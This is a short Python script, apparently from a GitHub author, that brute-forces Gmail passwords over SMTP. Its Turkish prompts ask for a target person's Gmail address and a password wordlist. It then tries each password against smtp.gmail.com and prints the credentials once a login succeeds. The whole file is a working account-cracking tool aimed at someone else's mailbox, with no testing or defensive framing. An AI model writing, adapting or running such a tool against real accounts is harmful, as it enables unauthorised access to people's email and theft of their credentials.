# Date : 24/07/2020
# Author : @emrecelep (Github)
# Description : Gmail ( SMTP Server ) bruter


import smtplib
import os

# text color code
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
cyan = "\033[1;36m"
default = "\033[1;37m"

# Smtp server connection
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
except:
    os.system("clear")
    print(red + "Hata : " + default + "İnternet bağlantısı yok")
    exit()


def user_input_email():
    user_input = input(default + "Hedef kişinin e-posta adresi : " + cyan)

    if user_input.endswith("@gmail.com"):
        return user_input
    else:
        os.system("clear")
        print(red + "Hata : " + default + "Lütfen formata uygun yazınız : ( kullaniciadi@gmail.com )")
        exit()


def user_input_pass_file():
    user_input = input(default + "Hazırladığınz wordlist dosyasının yolu : " + cyan)

    if os.path.exists(user_input) and user_input.endswith(".txt"):
        return user_input
    else:
        return "password.txt"


def bruteforce():
    target_email = user_input_email()
    password_file = user_input_pass_file()
    print()

    password_file = open(password_file, "r", encoding="utf-8")
    try:
        for password in password_file:
            print(default+"[" + yellow + " Uygulanan Şifre " + default + "] => " + green + password + default,end="")

            try:
                server.login(target_email, password)
                os.system("clear")
                print("[" + yellow + " Kullanıcı E-posta Adresi " + default + "]  => " + red + target_email + default)
                print("[" + yellow + " Kullanıcı E-posta Şifresi " + default + "] => " + red + password + default)
                exit()
            except smtplib.SMTPAuthenticationError:
                pass
    except KeyboardInterrupt:
        os.system("clear")
        print(default+"["+yellow+" Çıkış yapılıyor... "+default+"]")
        os.system("sleep 2")
        exit()

    os.system("clear")
    print(default + "[" + yellow + "Sonuç" + default + "] = Hedef şifre bulunamadı")
    exit()


bruteforce()
